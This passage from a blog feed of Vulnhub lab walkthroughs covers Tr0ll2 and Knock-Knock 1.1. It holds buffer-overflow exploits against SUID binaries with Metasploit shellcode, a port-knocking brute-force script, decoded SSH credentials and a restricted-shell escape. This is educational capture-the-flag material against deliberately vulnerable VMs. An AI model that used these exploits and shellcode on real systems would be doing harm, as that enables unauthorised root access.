<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x6a413969
</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use metasploit to generate a shellcode to run <code>/bin/sh</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(exec) > generate -b &lsquo;\x00\x0a\x0d&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>linux/x86/exec - 70 bytes&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;a href="http://www.metasploit.com">http://www.metasploit.com&lt;/a>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>Encoder: x86/shikata_ga_nai&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>VERBOSE=false, PrependFork=false, PrependSetresuid=false,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>PrependSetreuid=false, PrependSetuid=false,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>PrependSetresgid=false, PrependSetregid=false,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>PrependSetgid=false, PrependChrootBreak=false,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>AppendExit=false, CMD=/bin/sh&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>buf =
</span><span class='line'>&ldquo;\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9&rdquo; +
</span><span class='line'>&ldquo;\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11&rdquo; +
</span><span class='line'>&ldquo;\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55&rdquo; +
</span><span class='line'>&ldquo;\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a&rdquo; +
</span><span class='line'>&ldquo;\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93&rdquo;
</span><span class='line'>msf payload(exec) ></span></code></pre></td></tr></table></div></figure></p>

<p>Next, construct the payload and exploit the <code>r00t</code> file to get ROOT on the target!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;\x80\xfb\xff\xbf&rsquo; + &lsquo;\x90&rsquo; * 16 + &lsquo;\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93&rsquo;&rdquo;)
</span><span class='line'>&lt;7\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'&ldquo;)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</span></code></pre></td></tr></table></div></figure></p>

<p>And then take the FLAG down!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cd /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cd /root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -al
</span><span class='line'>total 80
</span><span class='line'>drwx&mdash;&mdash; 11 root   root   4096 Oct 14  2014 .
</span><span class='line'>drwxr-xr-x 23 root   root   4096 Oct  5  2014 ..
</span><span class='line'>-rw&mdash;&mdash;-  1 root   root     67 Oct 14  2014 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root   3106 Apr 19  2012 .bashrc
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root    140 Apr 19  2012 .profile
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root     66 Oct  5  2014 .selected_editor
</span><span class='line'>drwx&mdash;&mdash;  2 root   root   4096 Oct  4  2014 .ssh
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 .vim
</span><span class='line'>-rw&mdash;&mdash;-  1 root   root   4259 Oct 14  2014 .viminfo
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root     68 Oct  6  2014 Proof.txt
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core1
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core2
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core3
</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core4
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 goal
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode
</span><span class='line'>-rw-r&ndash;r&ndash;  1 maleus maleus 1474 Oct  4  2014 lmao.zip
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root    828 Oct  4  2014 ran_dir.py
</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat Proof.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cat Proof.txt
</span><span class='line'>You win this time young Jedi&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>a70354f0258dcc00292c72aab3c8b1e4&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Knock-Knock: 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/"/>
    <updated>2015-06-21T04:49:54-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Pretty much thought of a pretty neat idea I hadn&rsquo;t seen done before with a VM, and I wanted to turn it into reality!
Your job is to escalate to root, and find the flag.
Since I&rsquo;ve gotten a few PM&rsquo;s, remember: There is a difference between &#8220;Port Unreachable&rdquo; and &ldquo;Host Unreachable&rdquo;. DHCP is not broken ;)
Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
Also, gotta thank barrebas who was able to find a way to make things easier&hellip; but of course that is fixed with this update! ;)&ldquo; &ndash; <font color="green"><em>zer0w1re</em></font></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/knock-knock-11,105/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: TopHatSec: Freshly (<em>10.10.10.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Port knocking brute-force to open the hidden ports</li>
<li>Secret information hidden in picture</li>
<li>Buffer Overflow analysis and exploit</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Analysis and write script to brute force port knocking</li>
<li>Port scanned again to dicover the real open ports [<font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture and reveal the hidden information</li>
<li>Crack the cipher text to get login creditional in plain text [<font color="FF8000">Caesar shift with ROT 13</font>]</li>
<li>Login SSH with cracked login creditional</li>
<li>Look around and found suspicious program with SUID bit set</li>
<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.140 in this case).</p>

<p><img class="left" src="/downloads/knock-knock/1.png"></p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, only TCP port 1337 has been discovered running on Ubuntu Linux.
<code>nmap -v -sV -A -O -T4 -p- 10.10.10.140</code></p>

<p><img class="left" src="/downloads/knock-knock/2.png"></p>

<h3>Port knocking</h3>

<p>In order to understand what Port Knocking is and how it works, I found the following 2 links: <a href="http://www.portknocking.org/">link_1</a>, <a href="https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu">link_2</a>.</p>

<p>Basically, I need to send SYN request to several random ports (3 in this case) in correct orders and valid time period, then the firewall or proxy will change the rules to open hidden ports.</p>

<p><img class="left" src="/downloads/knock-knock/3.png"></p>

<p>Due to there are 3 ports and total 6 possible orders for the sequence, I wrote a script to try all the possibilities.</p>

<p><figure class='code'><figcaption><span>knock.py  (knock.py)</span> <a href='/downloads/code/knock.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.140&quot;</span>			<span class="c">#target IP</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">Knockports</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>	<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
</span><span class='line'>		<span class="k">try</span><span class="p">:</span>
</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[*] Knocking on port: &quot;</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'>			<span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>			<span class="c"># set timeout in 0.1s</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>		<span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[-] </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">e</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>				<span class="c">#connect to port 1337 to grab three random ports</span>
</span><span class='line'>	<span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>	
</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;received: &quot;</span><span class="p">,</span> <span class="n">r</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>		<span class="c"># try all the possibility of 3-ports orders </span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Trying sequence </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>		<span class="n">Knockports</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;[*] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/knock-knock/4.png"></p>

<p>After run the script, use nmap to check open services.</p>

<p><img class="left" src="/downloads/knock-knock/5.png"></p>

<p>Now two more ports discovered: <code>22</code> and <code>80</code>.</p>

<p>Next I run nikto scan on port 80 and Dirbuster to guess hidden paths as standard procedure but nothing found, only the knock knock picture. So I downloaded the picture and use command <code>strings</code> to check if there is anything hidden in the the picture.</p>

<p><img class="left" src="/downloads/knock-knock/6.png"></p>

<p>Bingo! Very juicy information found in the end:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw90w</span></code></pre></td></tr></table></div></figure></p>

<p>After tried several different encryption methods, I found this is encrypted by <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> with ROT-13. There is an useful online <a href="http://www.xarg.org/tools/caesar-cipher/">Caesarian cipher decryption tool</a> which allow me to decrypt cipher text in different ROT number to detect the correct ROT number.</p>

<p>After decrypted:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW       -     nosaJ
</span><span class='line'>sax2Cw9Ow   -     fnk2Pj9Bj</span></code></pre></td></tr></table></div></figure></p>

<p>They are actually backwards, so the Login Credential is</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure></p>

<p>Now I can SSH login to the target (I tried &lsquo;Jason&rsquo; first but failed, when I tried all lower case &lsquo;jason&rsquo;, it works)</p>

<p><img class="left" src="/downloads/knock-knock/7.png"></p>

<h3>Shell Escape</h3>

<p>Due to the current shell is Restricted, I use python <code>python -c "import pty; pty.spawn('/bin/bash')"</code> to escape.</p>

<p><img class="left" src="/downloads/knock-knock/8.png"></p>

<p>By poking around, I found a binary program &lsquo;tfc&rsquo; with SUID bit set which normally can help us to get ROOT.</p>

<p><img class="left" src="/downloads/knock-knock/9.png"></p>

<p>This is a file encryption program, first argument is the input file (plain text) and the second argument is the output file (cipher text), both of the input and output have to be <code>.tfc</code> extension.</p>

<p><img class="left" src="/downloads/knock-knock/10.png"></p>

<p>As we can see above, reverse the input file and output file, it will decrypt the cipher text.</p>

<p>Now let&rsquo;s try a large file to see if it has Buffer Overflow vulnerability.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c &ldquo;print &lsquo;A&rsquo;*5000&rdquo; > in.tfc
</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure></p>

<p>Segmentation fault!! sounds like it has BoF. Then I use <a href="link:%20http://www.trapkit.de/tools/checksec.html">searchsec.sh</a> to check what protections are enabled on it.</p>

<p><img class="left" src="/downloads/knock-knock/11.png"></p>

<p>Cool, there is no any protection at all!</p>

<p>Due to gdb is not installed on the target machine, I have to download the tfc program to my Kali for further analyzing.</p>

<p><img class="left" src="/downloads/knock-knock/12.png"></p>

<p>Why here is <code>0x0675c916</code> but not expected <code>0x41414141</code>? After playing around and further analysis, this should be encrypted of <code>0x41414141</code>. So I need the payload encrypted first. Thanks to <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>. He provided a method to get encrypted data from core dump file. This method will save lots of time and works to reverse engineering the <code>tfc</code> program for re-writing the encryption script.</p>

<p>Next, I need to find where is the offset to just change the EIP. After tried several varying lengths and checking the value of return address in gdb. I finally found the offset to overwrite the return address (4124 bytes).</p>

<p>Due to 4 &lsquo;A&rsquo;s always starts with same bytes &#8216;def0 5bab&rsquo; in encrypted file, So &lsquo;def0 5bab&rsquo; can be used as a pattern to locate encrypted data in core dump file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 100&rsquo; > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;p>File crypted, goodbye!
</span><span class='line'>root@kali:~# xxd out.tfc | head
</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 5000&rsquo; > in.tfc
</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~# xxd core | grep &lsquo;def0 5bab&rsquo;
</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>

<p>Next, use <code>msfelfscan</code> to get jmp esp address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc
</span><span class='line'>[tfc]
</span><span class='line'>0x08048e93 jmp esp
</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure></p>

<p>Then use msf with payload (<font color="red"><em>linux/x86/exec</em></font>) to generate shellcode</p>

<p><img class="left" src="/downloads/knock-knock/13.png"></p>

<p><code>-b</code> switch will blacklist special characters.</p>

<p>Then I wrote a python script to output payload with shellcode.</p>

<p><figure class='code'><figcaption><span>payload.py  (payload.py)</span> <a href='/downloads/code/payload.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xb8\x87\x10\x54\x8e\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x72\x7a\x5f\xd6\xe5\x29\x39\x8e\x38\xad\x4c\xa9\x2a\x1e\x3c\x5e\xaa\x08\xed\xfc\xc3\xa6\x78\xe3\x41\xdf\x73\xe4\x65\x1f\xab\x86\x0c\x71\x9c\x35\xa6\x8d\xb5\xea\xbf\x6f\xf4\x8d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4124</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>				<span class="c"># 0x08048e93 jmp esp</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span> 						<span class="c"># padding 20 NOPs to protect shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5000</span> <span class="o">-</span> <span class="mi">4124</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span><span class="mi">20</span> <span class="o">-</span><span class="mi">70</span><span class="p">)</span>	<span class="c"># padding with &#39;C&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">content</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Next, use <code>tfc</code> program to encrypt the payload and dump the encrypted data from core dump</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# python payload.py > in.tfc
</span><span class='line'>root@kali:~/Knock# ./tfc in.tfc out.tfc
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>root@kali:~/Knock# xxd /tmp/core-tfc-11-0-0-18419-1434802506 | grep &lsquo;def0 5bab&rsquo;
</span><span class='line'>0034340: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>

<p>Then use <code>dd</code> to carve out the encrypted data, byte by byte, skipping the first 213824 bytes (0034340 in HEX) and count is the length of exploit payload (5000 bytes)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# dd if=/tmp/core-tfc-11-0-0-18419-1434802506 of=exp.tfc skip=213824 count=5000 bs=1
</span><span class='line'>5000+0 records in
</span><span class='line'>5000+0 records out
</span><span class='line'>5000 bytes (5.0 kB) copied, 0.0723968 s, 69.1 kB/s</span></code></pre></td></tr></table></div></figure></p>

<p>Now try to exploit &lsquo;tfc&rsquo; program with the encrypted exploit payload (exp.tfc):</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# ./tfc exp.tfc pwn.tfc&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>exit&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>Cool, it works on my Kali!</p>

<p>Now, upload <code>exp.tfc</code> to target machine and exploit <code>tfc</code> to get ROOT!</p>

<p><img class="left" src="/downloads/knock-knock/14.png"></p>

<p>Done :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]TopHatSec: Freshly]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly/"/>
    <updated>2015-06-13T04:57:26-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/06/13/vulnhub-tophatsec-freshly</id>
    <content type="html"><![CDATA[<p>&ldquo;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification. :)
There are a couple of different ways that you can go with this one. Good luck!&rdquo; &ndash; <font color="green"><em>TopHatSec</em></font></p>

<p>&ldquo;VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/.</a>&rdquo; &ndash; <font color="green"><em>VulnHub</em></font></p>

